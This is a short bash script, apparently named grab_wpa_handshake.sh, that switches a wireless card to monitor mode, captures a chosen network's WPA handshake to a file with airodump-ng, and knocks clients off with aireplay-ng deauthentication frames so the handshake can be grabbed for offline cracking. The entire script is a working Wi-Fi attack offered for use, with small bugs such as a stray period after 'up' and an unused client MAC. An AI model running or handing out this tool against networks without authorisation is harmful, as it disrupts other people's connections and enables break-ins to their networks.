#!/bin/bash

monitor_mode() {
	echo "Putting $1 into monitor mode..."
	
	sudo ifconfig $1 down
	sudo iwconfig $1 mode monitor
	sudo ifconfig $1 up

	echo "Killing NetworkManager"
	sudo systemctl stop NetworkManager
}

get_handshake() {
	sudo airodump-ng $1

	echo -e "\nEnter the BSSID of the target network: "
	read bssid

	echo -e "\nEnter the channel of the target network: "
	read channel

	konsole --hold -e "airodump-ng -c $channel --bssid $bssid -w ./captured_key --output-format cap $1" &> /dev/null &
	pid=$!

	echo "Enter the mac of the client to boot: "
	read client

	echo -e "\nDeauthing $client..."
	sudo aireplay-ng --deauth 4 -a $bssid $1

	echo -e "\nPress ENTER to continue begin exit process"
	read

	sudo kill $!
}

revert_interface() {
	echo "Putting $1 back into managed mode..."

	sudo ifconfig $1 down
	sudo iwconfig $1 mode managed
	sudo ifconfig $1 up.

	sudo systemctl start NetworkManager
}

if [ $# -ne 1 ]; then
	echo "Interface not specified."
	echo "Usage: ./grab_wpa_handshake.sh <interface name>"
	exit 1
fi

monitor_mode $1
get_handshake $1
revert_interface $1